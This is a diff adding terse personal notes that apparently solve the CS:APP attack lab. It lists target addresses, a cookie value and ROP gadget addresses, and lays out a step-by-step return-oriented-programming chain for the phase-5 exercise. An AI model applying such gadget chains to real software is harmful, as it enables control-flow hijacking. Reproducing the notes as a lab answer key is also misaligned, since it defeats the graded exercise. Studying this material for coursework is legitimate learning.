@@ -1,0 +1,58 @@
+cookie 0x76927bbf
+touch2 0x555555401ae0
+rsp 0x55555586fd68
+touch3 0x555555401bf7
+
+rtarget touch2 0x555555401ae0
+
+char to ascii
+7 37
+6 36
+9 39
+2 32
+7 37
+b 62
+b 62
+f 66
+
+gadget 1 
+0x555555401ca1 + 0x4 = 0x555555401CA5 addval_412
+0x555555401cc8 + 0x3 = 0x555555401CCB setval_388
+
+gadget 2
+0x555555401cb4 + 0x3 = 0x555555401CB7 addval_281
+0x555555401cae + 0x1 = 0x555555401CAF getval_423
+
+l5 https://stackoverflow.com/questions/54602292/segmentation-fault-in-attack-lab-phase5
+step1 mov %rsp, %rax
+0x555555401d7a + 0x2 = 0x555555401D7C addval_237
+
+step2 mov %rax, %rdi
+0x555555401cae + 0x1 = 0x555555401CAF getval_423
+
+step3 pop %rax
+0x555555401ca1 + 0x4 = 0x555555401CA5 addval_412
+
+step4 offset string from rsp
+0x48, 0x41
+
+step5 89 c2 movl %eax, %ecx
+0x555555401d73 + 0x2 = 0x555555401D75 addval_191
+
+step6 89 d1 movl %ecx, %edx
+0x555555401d09 + 0x1 = 0x555555401D0A getval_102
+
+step7 89 ce movl %edx, %esi
+0x555555401d4a + 0x2 = 0x555555401D4C addval_480
+
+step8 lea (%rdi, %rsi, 1), %rax
+0x555555401cd5
+
+step9 48 89 c7 c3 mov  %rax, %rdi
+0x555555401cae + 0x1 = 0x555555401CAF getval_423
+
+step10 touch3 address
+0x555555401bf7
+
+step11 cookie string ascii
+37 36 39 32 37 62 62 66
